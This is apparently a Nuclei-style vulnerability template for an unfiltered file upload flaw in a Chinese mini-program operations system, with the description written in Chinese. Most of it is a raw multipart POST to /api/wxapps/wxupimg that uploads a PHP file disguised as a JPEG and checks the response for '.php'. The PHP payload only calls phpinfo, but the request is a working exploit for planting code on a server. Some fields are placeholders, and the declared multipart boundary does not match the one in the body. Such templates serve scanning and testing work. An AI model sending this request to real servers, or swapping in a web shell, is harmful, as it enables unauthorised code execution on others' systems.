id: qhyxcx-Wxapps-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 全行业小程序运营系统是一个无需编程，各行业模版直接套用，一键生成，轻松搭建小程序，界面自由DIY，同步实时预览，可视化操作让您所见即所得，随心打造个性小程序。 接口位于/api/controller/Wxapps.php控制器的wxupimg方法使用ThinkPHP原生上传函数 file() 上传文件，且未有过滤，导致漏洞产生。
  reference:
    - https://mp.weixin.qq.com/s/-6lYJFmRJUYHd1O-yFXZMg
    - https://github.com/wy876/POC/blob/main/%E5%85%A8%E8%A1%8C%E4%B8%9A%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3Wxapps.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /api/wxapps/wxupimg HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cache-Control: max-age=0
        Connection: keep-alive
        Content-Length: 195
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNGBhBIC624F4IANg
        Host: {{Hostname}}
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        sec-fetch-user: ?1

        ------WebKitFormBoundary03rNBzFMIytvpWhy
        Content-Disposition: form-data; name="file"; filename="1.php"
        Content-Type: image/jpeg

        <?php phpinfo();?>
        ------WebKitFormBoundary03rNBzFMIytvpWhy--
    matchers:
      - type: word
        part: body
        words:
          - '.php'
